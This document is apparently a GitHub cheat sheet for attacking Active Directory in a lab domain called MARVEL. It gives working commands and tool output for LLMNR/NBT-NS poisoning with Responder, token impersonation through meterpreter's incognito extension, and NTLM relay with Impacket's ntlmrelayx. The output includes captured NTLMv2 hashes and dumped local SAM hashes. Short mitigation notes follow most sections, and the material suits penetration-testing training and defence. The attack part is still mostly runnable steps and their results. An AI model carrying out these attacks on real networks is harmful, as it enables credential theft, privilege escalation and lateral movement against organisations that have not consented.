# ADCheatSheet
Active Directory Cheat Sheet

#### LLMNR/NBT-NS poisoning 

`responder -I eth0 -rdw`
```
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 192.168.22.137
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:93b1788c58f638fa:B2CA7875629275D309D734EC71F9E286:0101000000000000C0653150DE09D2013126B37886358E89000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000001000000002000006010A3B377FCEC86F76295A06081F0D3B51DCECFF04B43D87CAF05972C41D0A80A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00320032002E003100380033000000000000000000
```
Recommendations:

```
Best option is to disable LLMNR and NBT-NS.
If company must use LLMNR and NBT-NS, enable Network Access Control (if attacker cannot access to networ, tha attack can not be performed )
Require Strong user password (e.g. >12 characters in lengt and limit common word usage)
References:
https://cccsecuritycenter.org/remediation/llmnr-nbt-ns
```

#### Token Impersonation (meterpreter)
Requirements: 
- NT AUTHORITY SYSTEM
- meterpreter proc arch = sys arch
```
meterpreter > load incognito 
Loading extension incognito...Success.
meterpreter > list_tokens 
Usage: list_tokens <list_order_option>

Lists all accessible tokens and their privilege level

OPTIONS:

    -g        List tokens by unique groupname
    -u        List tokens by unique username

meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
Font Driver Host\UMFD-2
MARVEL\Administrator
MARVEL\fcastle
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1
Window Manager\DWM-2

Impersonation Tokens Available
========================================
No tokens available

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > impersonate_token MARVEL\\Administrator
[+] Delegation token available
[+] Successfully impersonated user MARVEL\Administrator
```
Recommendations:

```
TBA
```
#### NTLM Relay

Change setings in Responder.conf
```
root@marvel:~# cat /usr/share/responder/Responder.conf 
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On

```
Fire up Responder
`responder -rdwv -I eth0`
Second Terminal  Fire up ntlmrealyx.pl from Impacket
`python ntlmrelayx.py -tf target.txt  -smb2support`

Output from Responder:
```
[HTTP] Sending NTLM authentication request to 192.168.22.213
[HTTP] GET request from: 192.168.22.213   URL: / 
[HTTP] Host             : 192.168.22.183 
[HTTP] NTLMv2 Client   : 192.168.22.213
[HTTP] NTLMv2 Username : MARVEL\fcastle
[HTTP] NTLMv2 Hash     : fcastle::MARVEL:2b2108757091455d:688F63B5623FF9BBC230ACFB596117C4:010100000000000095CBA4840BC2D5014512A438AF3F7D97000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000100000536C39E55E2469C08DAC46B0D5BB77645063D14D65BAE14C2AA4565A39A03E8A0A001000920918B91B320ACA2234D7731132F4070900260048005400540050002F003100390032002E003100360038002E00320032002E003100380033000000000000000000

```
Output from ntlmrelayx.py:
```
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
[*] HTTPD: Received connection from 192.168.22.213, attacking target smb://192.168.22.212
[*] HTTPD: Received connection from 192.168.22.213, attacking target smb://192.168.22.212
[*] Authenticating against smb://192.168.22.212 as MARVEL\fcastle SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Authenticating against smb://192.168.22.212 as MARVEL\fcastle SUCCEED
[-] 'CurrentState'
[*] Target system bootKey: 0x56ae13534cc70dccd75837d753af6890
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:99216251ddf5fa6c4c2761e417f5ad85:::
Peter:1001:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Done dumping SAM hashes for host: 192.168.22.212
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```
Tips:
- Check your Responder certs `Error Code: DLG_FLAGS_INVALID_CA
DLG_FLAGS_SEC_CERT_CN_INVALID`

Recommendations:
```
SMB Signing Disabled is a Medium risk vulnerability and should be Enabled to prevent NTLM Relay Attacks.
References:
https://beyondsecurity.com/scan-pentest-network-vulnerabilities-smb-signing-disabled.html
```
